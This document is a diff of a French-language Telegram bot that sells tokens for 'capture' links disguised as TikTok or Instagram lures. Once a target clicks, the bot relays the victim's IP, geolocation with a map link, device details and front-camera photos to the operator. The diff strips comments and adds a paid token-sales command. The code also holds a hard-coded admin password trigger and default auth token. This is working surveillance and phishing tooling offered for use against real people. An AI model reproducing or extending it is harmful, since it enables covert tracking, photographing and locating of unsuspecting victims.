@@ -9,16 +9,13 @@ const crypto = require("crypto");
 dotenv.config();
 
 // --- 1. GESTION DE LA PERSISTANCE (SAUVEGARDE) ---
-// Dossier de données
 const dataDir = path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) {
-    fs.mkdirSync(dataDir); // Créer le dossier s'il n'existe pas
+    fs.mkdirSync(dataDir);
 }
 
-// Fichier des utilisateurs
 const usersFilePath = path.join(dataDir, 'users.json');
 
-// Charger les données existantes
 let usersData = {};
 if (fs.existsSync(usersFilePath)) {
     try {
@@ -29,7 +26,6 @@ if (fs.existsSync(usersFilePath)) {
     }
 }
 
-// Fonction de sauvegarde
 function saveUsers() {
     try {
         fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
@@ -39,11 +35,9 @@ function saveUsers() {
 }
 
 // --- 2. CONFIGURATION DU BOT ---
-// Réduire les logs verbeux TLS
 process.env.NTBA_FIX_319 = 1;
 process.env.NTBA_FIX_350 = 1;
 
-// Filtrer les logs console encombrants
 const originalLog = console.log;
 console.log = (...args) => {
     const message = args.join(" ");
@@ -51,14 +45,12 @@ console.log = (...args) => {
     originalLog.apply(console, args);
 };
 
-// Vérification du Token
 const token = process.env.TELEGRAM_BOT_TOKEN;
 if (!token) {
     console.error("❌ TELEGRAM_BOT_TOKEN manquant !");
     process.exit(1);
 }
 
-// Initialisation du bot
 const bot = new TelegramBot(token, { 
     polling: {
         autoStart: true,
@@ -66,55 +58,48 @@ const bot = new TelegramBot(token, {
     } 
 });
 
-// URL du serveur backend (pour l'API)
 const BASE_URL = process.env.RENDER_EXTERNAL_URL 
     ? process.env.RENDER_EXTERNAL_URL.replace(/\/$/, "")
     : `http://localhost:${process.env.PORT || 5000}`;
 
-// Authentification sécurisée (doit correspondre à app.js)
 const DEFAULT_SECURE_TOKEN = "secure_default_token_" + crypto.createHash("sha256").update("replit_telegram_bot_2024").digest("hex");
 const authToken = process.env.DATA_ACCESS_TOKEN || DEFAULT_SECURE_TOKEN;
 
-// --- 3. VARIABLES D'ÉTAT ---
 let isAdminMode = false;
 
 console.log(`🤖 Bot Telegram démarré !`);
 console.log(`📡 Connecté au backend : ${BASE_URL}`);
 
-// --- 4. COMMANDES ADMINISTRATEUR ---
+// --- 3. COMMANDES ADMINISTRATEUR ---
 
-// Activer le mode Admin (Mot de passe)
 bot.onText(/DsSiakaAdmin/, (msg) => {
     isAdminMode = true;
-    bot.sendMessage(msg.chat.id, "🔓 **Mode Admin ACTIVÉ !**\n\nCommandes disponibles :\n`/addcoins [ID] [MONTANT]`\n`/lock` pour verrouiller.", { parse_mode: "Markdown" });
+    bot.sendMessage(msg.chat.id, "🔓 **Mode Admin ACTIVÉ !**\n\nCommandes :\n`/addcoins [ID] [MONTANT]`\n`/lock` pour verrouiller.", { parse_mode: "Markdown" });
 });
 
-// Désactiver le mode Admin
 bot.onText(/\/lock/, (msg) => {
     isAdminMode = false;
     bot.sendMessage(msg.chat.id, "🔒 **Mode Admin VERROUILLÉ.**");
 });
 
-// Ajouter des jetons (Seulement si Admin)
 bot.onText(/\/addcoins (\d+) (\d+)/, (msg, match) => {
     const chatId = msg.chat.id;
-    if (!isAdminMode) return bot.sendMessage(chatId, "🚫 **Accès refusé.** Entrez le mot de passe admin.");
+    if (!isAdminMode) return bot.sendMessage(chatId, "🚫 **Accès refusé.**");
 
-    const targetId = match[1]; // ID de l'utilisateur cible
-    const amount = parseInt(match[2]); // Montant à ajouter
+    const targetId = match[1];
+    const amount = parseInt(match[2]);
 
     if (!usersData[targetId]) usersData[targetId] = { coins: 0 };
     usersData[targetId].coins += amount;
     
-    saveUsers(); // Sauvegarde immédiate
+    saveUsers();
     
     bot.sendMessage(chatId, `✅ **Succès !**\n${amount} jetons ajoutés à l'utilisateur \`${targetId}\`.\nNouveau solde : ${usersData[targetId].coins} 🪙`, { parse_mode: "Markdown" });
     
-    // Notification à l'utilisateur (optionnel, peut échouer si l'user n'a pas démarré le bot)
-    bot.sendMessage(targetId, `🎁 **Félicitations !**\nL'administrateur vous a crédité de ${amount} jetons.\nNouveau solde : ${usersData[targetId].coins} 🪙`).catch(() => {});
+    bot.sendMessage(targetId, `🎁 **Paiement Reçu !**\nL'admin vous a crédité de ${amount} jetons.\nNouveau solde : ${usersData[targetId].coins} 🪙`).catch(() => {});
 });
 
-// --- 5. COMMANDES UTILISATEUR ---
+// --- 4. COMMANDES UTILISATEUR & VENTE ---
 
 // /start
 bot.onText(/\/start/, (msg) => {
@@ -125,27 +110,47 @@ bot.onText(/\/start/, (msg) => {
         `🔥 *Bot de Capture Activé !*\n\n` +
         `💰 *Votre Solde :* ${coins} jetons\n\n` +
         `🎯 *Menu :* \n` +
-        `/generate - Créer un lien (coût: 1 🪙)\n` +
+        `/generate - Créer un lien (1 🪙)\n` +
+        `/acheter - Acheter des jetons 💎\n` +
         `/balance - Voir mon solde\n` +
         `/help - Aide`, 
         { parse_mode: "Markdown" }
     );
 });
 
-// /balance (Voir solde)
-bot.onText(/\/balance/, (msg) => {
-    const coins = usersData[msg.chat.id]?.coins || 0;
-    bot.sendMessage(msg.chat.id, `💰 **Votre portefeuille :**\n\nVous possédez : *${coins} jetons* 🪙`, { parse_mode: "Markdown" });
+// /acheter (COMMANDE DE VENTE)
+bot.onText(/\/acheter/, (msg) => {
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, 
+        `💎 **ACHETER DES JETONS** 💎\n\n` +
+        `Pour recharger votre compte, contactez :\n` +
+        `👉 **@DsSiaka**\n\n` +
+        `🆔 **Ton ID à lui donner :** \`${chatId}\`\n\n` +
+        `⚡ Paiement rapide et recharge immédiate !`, 
+        { parse_mode: "Markdown" }
+    );
 });
 
-// /generate (Générer lien)
+// /balance
+bot.onText(/\/balance/, (msg) => {
+    const coins = usersData[msg.chat.id]?.coins || 0;
+    bot.sendMessage(msg.chat.id, `💰 **Portefeuille :** ${coins} jetons 🪙\nBesoin de plus ? Contactez @DsSiaka`, { parse_mode: "Markdown" });
+});
+
+// /generate (GÉNÉRATION AVEC VÉRIFICATION)
 bot.onText(/\/generate/, (msg) => {
     const chatId = msg.chat.id;
     const coins = usersData[chatId]?.coins || 0;
 
-    // 1. Vérifier le solde AVANT d'afficher le menu
+    // --- MODIFICATION ICI : MESSAGE SOLDE INSUFFISANT ---
     if (coins <= 0) {
-        return bot.sendMessage(chatId, "⚠️ **Solde insuffisant !**\n\nIl vous faut 1 jeton pour générer un lien.\nContactez l'administrateur pour recharger votre compte.", { parse_mode: "Markdown" });
+        return bot.sendMessage(chatId, 
+            `⚠️ **Solde insuffisant !**\n\n` +
+            `Il vous faut 1 jeton pour générer un lien.\n\n` +
+            `🛒 **Pour recharger votre compte :**\n` +
+            `Contactez l'administrateur 👉 **@DsSiaka**`, 
+            { parse_mode: "Markdown" }
+        );
     }
 
     const keyboard = {
@@ -157,18 +162,14 @@ bot.onText(/\/generate/, (msg) => {
         }
     };
 
-    bot.sendMessage(chatId, `🎯 *Générateur de Liens*\n\nSolde actuel : ${coins} 🪙\nCoût par lien : 1 🪙\n\n*Choisis la plateforme :*`, { parse_mode: "Markdown", ...keyboard });
+    bot.sendMessage(chatId, `🎯 *Générateur de Liens*\n\nSolde : ${coins} 🪙\nCoût : 1 🪙\n\n*Choisis la plateforme :*`, { parse_mode: "Markdown", ...keyboard });
 });
 
-// --- 6. GESTION DES CLICS (CALLBACKS) ---
+// --- 5. GESTION DES CLICS ---
 bot.on("callback_query", async (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
 
-    // Répondre pour arrêter le chargement du bouton
-    // On ne met pas de texte ici pour éviter le popup, sauf erreur
-    
-    // Cas 1 : Voir les données (data_ID)
     if (data.startsWith("data_")) {
         bot.answerCallbackQuery(query.id);
         const linkId = data.replace("data_", "");
@@ -176,30 +177,27 @@ bot.on("callback_query", async (query) => {
         return;
     }
 
-    // Cas 2 : Générer un lien (tiktok, instagram, etc.)
     const platform = data;
     
-    // Vérification de sécurité du solde (Double check)
+    // --- MODIFICATION ICI : ALERTE SOLDE INSUFFISANT ---
     if (!usersData[chatId] || usersData[chatId].coins <= 0) {
-        return bot.answerCallbackQuery(query.id, { text: "❌ Solde insuffisant !", show_alert: true });
+        bot.sendMessage(chatId, "❌ **Solde épuisé !** Contactez @DsSiaka pour recharger.");
+        return bot.answerCallbackQuery(query.id, { text: "❌ Solde insuffisant ! Contactez @DsSiaka", show_alert: true });
     }
 
     try {
-        // Appel à l'API locale (app.js) pour créer le lien
         const response = await axios.post(`${BASE_URL}/generate-link`, { platform, chatId });
         const { id, url } = response.data;
 
-        // ✅ DÉDUCTION DU JETON
         usersData[chatId].coins -= 1;
-        saveUsers(); // Sauvegarder immédiatement
+        saveUsers();
 
         bot.answerCallbackQuery(query.id, { text: "✅ Lien généré ! -1 Jeton" });
 
-        const message = `✅ *LIEN CRÉÉ AVEC SUCCÈS !*\n\n` +
-                        `🔗 *Lien :* ${url}\n` +
-                        `🆔 *ID :* \`${id}\`\n\n` +
-                        `💰 *Nouveau solde :* ${usersData[chatId].coins} 🪙\n` +
-                        `⚡ Les données arriveront ici dès que la victime clique.`;
+        const message = `✅ *LIEN CRÉÉ !*\n\n` +
+                        `🔗 ${url}\n\n` +
+                        `💰 Restant : ${usersData[chatId].coins} 🪙\n` +
+                        `⚡ En attente du clic...`;
 
         const keyboard = {
             reply_markup: {
@@ -218,9 +216,8 @@ bot.on("callback_query", async (query) => {
     }
 });
 
-// --- 7. FONCTIONS D'AFFICHAGE DES DONNÉES ---
+// --- 6. AFFICHAGE DONNÉES ---
 
-// /data [ID]
 bot.onText(/\/data (.+)/, async (msg, match) => {
     await sendDataById(msg.chat.id, match[1].trim());
 });
@@ -232,60 +229,49 @@ async function sendDataById(chatId, linkId) {
         });
         const data = response.data;
 
-        let message = `📊 *RAPPORT DE CAPTURE* - \`${linkId}\`\n\n`;
-        message += `⏰ *Date :* ${new Date(data.timestamp).toLocaleString("fr-FR")}\n`;
-        message += `🌐 *IP :* ${data.ip || "Masquée"}\n\n`;
+        let message = `📊 *RAPPORT* - \`${linkId}\`\n\n`;
+        message += `⏰ ${new Date(data.timestamp).toLocaleString("fr-FR")}\n`;
+        message += `🌐 IP: ${data.ip || "Masquée"}\n`;
 
-        // Localisation
         if (data.location && data.location.latitude) {
-            message += `📍 *Position :* ${data.location.city || "?"}, ${data.location.country || "?"}\n`;
-            message += `(Précision: ~${data.location.accuracy || "?"}m)\n`;
-        } else {
-            message += `📍 *Position :* Refusée ou indisponible\n`;
+            message += `📍 ${data.location.city || "?"}, ${data.location.country || "?"}\n`;
         }
 
-        // Appareil
         if (data.device) {
-            message += `📱 *Mobile :* ${data.device.vendor || ""} ${data.device.model || data.device.platform || "Inconnu"}\n`;
-            message += `🔋 *Batterie :* ${data.device.batteryLevel ? (data.device.batteryLevel * 100) + "%" : "?"}\n`;
+            message += `📱 ${data.device.vendor || ""} ${data.device.model || "Mobile"}\n`;
         }
 
-        // Photos
-        const photoCount = data.images ? data.images.length : 0;
-        message += `\n📸 *Photos capturées :* ${photoCount}`;
+        message += `📸 Photos : ${data.images ? data.images.length : 0}`;
 
         await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
 
-        // Envoi de la 1ère photo
-        if (photoCount > 0) {
+        if (data.images && data.images.length > 0) {
             const imgBuffer = Buffer.from(data.images[0], "base64");
-            await bot.sendPhoto(chatId, imgBuffer, { caption: "📸 Photo 1 (Caméra Frontale)" });
+            await bot.sendPhoto(chatId, imgBuffer, { caption: "📸 Photo 1" });
         }
 
-        // Lien Google Maps
         if (data.location && data.location.latitude) {
-            const mapsUrl = `https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude}`;
-            bot.sendMessage(chatId, `🗺️ [Ouvrir sur Google Maps](${mapsUrl})`, { parse_mode: "Markdown", disable_web_page_preview: false });
+            const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
+            bot.sendMessage(chatId, `🗺️ [Voir sur la carte](${mapsUrl})`, { parse_mode: "Markdown", disable_web_page_preview: false });
         }
 
     } catch (error) {
-        bot.sendMessage(chatId, `❌ **Erreur :** Aucune donnée trouvée pour l'ID \`${linkId}\`.\nPeut-être que personne n'a encore cliqué ?`, { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, `❌ Pas de données pour \`${linkId}\``, { parse_mode: "Markdown" });
     }
 }
 
-// /help
+// /help (MODIFICATION ICI : AJOUT CONTACT)
 bot.onText(/\/help/, (msg) => {
     bot.sendMessage(msg.chat.id, 
         `📚 *AIDE*\n\n` +
-        `1. Tapez /generate pour avoir le menu.\n` +
-        `2. Sélectionnez un leurre (TikTok, etc.).\n` +
-        `3. Envoyez le lien à la cible.\n` +
-        `4. Quand la cible clique, vous recevez les infos ici.\n\n` +
-        `⚠️ *Note :* Chaque lien coûte 1 jeton.`, 
+        `1. /generate pour créer un lien.\n` +
+        `2. Envoie le lien à ta cible.\n` +
+        `3. Reçois les photos et la position ici.\n\n` +
+        `💎 **Besoin de jetons ?**\nContactez l'admin : **@DsSiaka**`, 
         { parse_mode: "Markdown" }
     );
 });
 
-// Gestion des erreurs globales
+// Erreurs
 bot.on("polling_error", (error) => console.log(`⚠️ Erreur Polling: ${error.message}`));
 bot.on("webhook_error", (error) => console.log(`⚠️ Erreur Webhook: ${error.message}`));
